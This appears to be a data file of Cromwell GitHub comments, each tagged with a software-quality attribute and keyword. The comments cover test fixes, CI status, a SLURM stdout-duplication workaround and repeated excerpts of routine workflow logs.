https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714768251:61,Testability,test,test,61,I merged in `develop` so I should now have picked up the AWS test fixes 🤞,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5906#issuecomment-714768251
https://github.com/broadinstitute/cromwell/pull/5908#issuecomment-702824459:4,Testability,log,logs,4,The logs for before and after this change are in comments in [WA-373](https://broadworkbench.atlassian.net/browse/WA-373) [here](https://broadworkbench.atlassian.net/browse/WA-373?focusedCommentId=35235),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5908#issuecomment-702824459
https://github.com/broadinstitute/cromwell/pull/5924#issuecomment-706359681:31,Testability,test,testing,31,"Looks good in the overnight CI testing. Just needed to rebase onto the head of develop to correct a merge conflict. Assuming Travis is still happy, I think we'll be good to go",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5924#issuecomment-706359681
https://github.com/broadinstitute/cromwell/pull/5927#issuecomment-706336430:20,Deployability,update,update,20,Closing because the update to 2.6.8 is about to be reverted,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5927#issuecomment-706336430
https://github.com/broadinstitute/cromwell/issues/5932#issuecomment-1301571393:16,Integrability,wrap,wrapper,16,"I find that the wrapper bash script (...`/execution/script`) that Cromwell generates tries to capture stdout and stderr in a convoluted way:; - it redirects the command's stdout (and stderr, separately) to a named pipe (a.k.a. FIFO); - it than captures the results from the FIFO, and uses `tee` to make a copy to .../execution/stdout (and stderr, respectively); - it doesn't do anything to the stdout of `tee`. So, `tee` writes another copy to it's own stdout.; - SLURM captures `tee`'s stdout (inherited from the parent script) and writes it to ...`/execution/stdout`. Similary for stderr. So, both copies generated by ""tee"" end up in ...`/exection/stdout`! The output is *duplicated*! This causes problems with subsequent steps in the WDL script. To work around this, I've changed the `-o` and `-e` options to:; ```; -o ${out}.slurm -e ${err}.slurm; ```; noting that `${out}` has the same value as `${cwd}/execution/stdout` in my environment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5932#issuecomment-1301571393
https://github.com/broadinstitute/cromwell/issues/5932#issuecomment-1301571393:495,Modifiability,inherit,inherited,495,"I find that the wrapper bash script (...`/execution/script`) that Cromwell generates tries to capture stdout and stderr in a convoluted way:; - it redirects the command's stdout (and stderr, separately) to a named pipe (a.k.a. FIFO); - it than captures the results from the FIFO, and uses `tee` to make a copy to .../execution/stdout (and stderr, respectively); - it doesn't do anything to the stdout of `tee`. So, `tee` writes another copy to it's own stdout.; - SLURM captures `tee`'s stdout (inherited from the parent script) and writes it to ...`/execution/stdout`. Similary for stderr. So, both copies generated by ""tee"" end up in ...`/exection/stdout`! The output is *duplicated*! This causes problems with subsequent steps in the WDL script. To work around this, I've changed the `-o` and `-e` options to:; ```; -o ${out}.slurm -e ${err}.slurm; ```; noting that `${out}` has the same value as `${cwd}/execution/stdout` in my environment.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5932#issuecomment-1301571393
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2713,Availability,echo,echo,2713,"ttempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2941,Availability,echo,echo,2941,"18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:3251,Availability,echo,echo,3251,"sa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1277,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,1277,".engine-dispatcher-21 INFO - MaterializeWorkflowDescriptorActor [UUID(efe9c9a5)]: Call-to-Backend assignments: drs_usa_jdr.localize_jdr_drs_with_usa -> papi-v2-usa, drs_usa_jdr.read_drs_with_usa -> papi-v2-usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa -> papi-v2-usa; 2020-10-13 18:57:57,875 cromwell-system-akka.dispatchers.engine-dispatcher-9 INFO - WorkflowExecutionActor-efe9c9a5-cd24-4c78-b39d-d9f10cc754de [UUID(efe9c9a5)]: Starting drs_usa_jdr.read_drs_with_usa, drs_usa_jdr.localize_jdr_drs_with_usa, drs_usa_jdr.skip_localize_jdr_drs_with_usa; 2020-10-13 18:57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts wer",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:1845,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,1845,":57:58,653 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.skip_localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,654 cromwell-system-akka.dispatchers.backend-dispatcher-81 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecu",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2392,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,2392,"te keys: backend; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.engine-dispatcher-26 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.localize_jdr_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 20",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2618,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,2618,"ould not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.localize_jdr_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,678 cromwell-system-akka.dispatchers.backend-dispatcher-63 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:2833,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,2833,"sApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:57:58,747 cromwell-system-akka.dispatchers.engine-dispatcher-20 INFO - efe9c9a5-cd24-4c78-b39d-d9f10cc754de-EngineJobExecutionActor-drs_usa_jdr.read_drs_with_usa:NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:3148,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,3148,":NA:1 [UUID(efe9c9a5)]: Could not copy a suitable cache hit for efe9c9a5:drs_usa_jdr.read_drs_with_usa:-1:1. No copy attempts were made.; 2020-10-13 18:57:58,881 cromwell-system-akka.dispatchers.backend-dispatcher-83 WARN - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Unrecognized runtime attribute keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335:3496,Deployability,Pipeline,PipelinesApiAsyncBackendJobExecutionActor,3496," keys: backend; 2020-10-13 18:58:01,299 cromwell-system-akka.dispatchers.backend-dispatcher-83 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: `echo file is read by the engine`; 2020-10-13 18:58:01,433 cromwell-system-akka.dispatchers.backend-dispatcher-81 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: `echo gs://broad-jade-dev-data-bucket/ca8edd48-e954-4c20-b911-b017fedffb67/585f3f19-985f-43b0-ab6a-79fa4c8310fc > path1`; 2020-10-13 18:58:01,809 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: `echo /cromwell_root/jade.datarepo-dev.broadinstitute.org/v1_f90f5d7f-c507-4e56-abfc-b965a66023fb_585f3f19-985f-43b0-ab6a-79fa4c8310fc/hello_jade.json > path1; 2020-10-13 18:58:03,926 cromwell-system-akka.dispatchers.backend-dispatcher-63 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,110 cromwell-system-akka.dispatchers.backend-dispatcher-38 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.read_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:05,896 cromwell-system-akka.dispatchers.backend-dispatcher-91 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.localize_jdr_drs_with_usa:NA:1]: Adjusting boot disk size to 12 GB: 10 GB (runtime attributes) + 1 GB (user command image) + 1 GB (Cromwell support images); 2020-10-13 18:58:34,415 cromwell-system-akka.dispatchers.backend-dispatcher-88 INFO - PipelinesApiAsyncBackendJobExecutionActor [UUID(efe9c9a5)drs_usa_jdr.skip_localize_jdr_",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5938#issuecomment-707961335
